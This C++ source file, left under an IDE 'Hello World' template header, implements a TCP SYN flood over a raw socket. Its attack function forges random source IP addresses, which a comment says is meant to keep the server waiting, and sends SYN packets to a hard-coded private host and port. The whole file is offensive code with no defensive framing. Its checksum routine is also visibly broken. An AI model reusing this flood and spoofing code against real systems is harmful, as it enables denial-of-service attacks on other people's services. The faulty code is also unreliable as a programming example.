//============================================================================
// Name        : SOCK_RAW.cpp
// Author      : LIRUIJIE
// Version     :
// Copyright   : Your copyright notice
// Description : Hello World in C++, Ansi-style
//============================================================================

#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <fcntl.h>
#include <wait.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <errno.h>
#include <linux/hdreg.h>
#include <linux/tcp.h>

using namespace std;

 unsigned char check_sum(unsigned short *addr,int len)
 {
	int nleft=len;
	register int sum=0;
	register unsigned short *w = addr;
	short answer=0;

	while(nleft>1)
	{
		sum+=(*w)++;
		nleft-=2;
	}
	if(nleft==1)
	{
		*(unsigned char *)(&answer)=*(unsigned char *)w;
		sum+=answer;
	}

	sum=(sum>>16)+(sum&0xffff);
	sum+=(sum>>16);
	answer=~sum;
	return(answer);
 }

 void attack(int skfd,struct sockaddr_in *target,unsigned short srcport)
 {
		char buf[128]={0};
		struct ip *ip;
		struct tcphdr *tcp;
		int ip_len;

		//在我们TCP的报文中Data没有字段，所以整个IP报文的长度
		ip_len = sizeof(struct ip)+sizeof(struct tcphdr);
		//开始填充IP首部
		ip=(struct ip*)buf;
		printf("struct ip len:%d",ip_len);
		sleep(1);
		ip->ip_v = IPVERSION;
		ip->ip_hl = sizeof(struct ip)>>2;
		ip->ip_tos = 0;
		ip->ip_len = htons(ip_len);
		ip->ip_id=0;
		ip->ip_off=0;
		ip->ip_ttl=IPDEFTTL;
		ip->ip_p=IPPROTO_TCP;
		ip->ip_sum=0;
		ip->ip_dst=target->sin_addr;

		//开始填充TCP首部
		tcp = (struct tcphdr*)(buf+sizeof(struct ip));
		tcp->source = htons(15566);
		tcp->dest = target->sin_port;
		tcp->seq = random();
		tcp->doff = 5;
		tcp->syn = 1;
		tcp->check = 0;

		for(int i=0;i<200;i++)
		{
			//源地址伪造，我们随便任意生成个地址，让服务器一直等待下去
			ip->ip_src.s_addr = random();//inet_addr("127.0.0.1");
			tcp->check=check_sum((unsigned short*)tcp,sizeof(struct tcphdr));
			sendto(skfd,buf,ip_len,0,(struct sockaddr*)target,sizeof(struct sockaddr_in));
			sleep(1);
		}
		while(1);
 }

 int main()
 {
 	cout << "!!!Hello World!!!" << endl; // prints !!!Hello World!!!
 	int sockfd  ;

 	struct sockaddr_in target;
 	sockfd = socket(AF_INET,SOCK_RAW,IPPROTO_TCP);
 	const int on =1;
 	if(sockfd < 0)
 	{
 		perror("create sockfd error\n");
 		exit(0);
 	}
 	if (setsockopt (sockfd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0)
 	{
 		printf("setsockopt error!\n");
 		exit(0);
 	}
 	bzero(&target,sizeof(struct sockaddr_in));
 	target.sin_family=AF_INET;
 	target.sin_port=htons(10010);
 	target.sin_addr.s_addr = inet_addr("192.168.1.38");
 	setuid(getpid());
 	attack(sockfd,&target,15566);
 	return 0;
 }
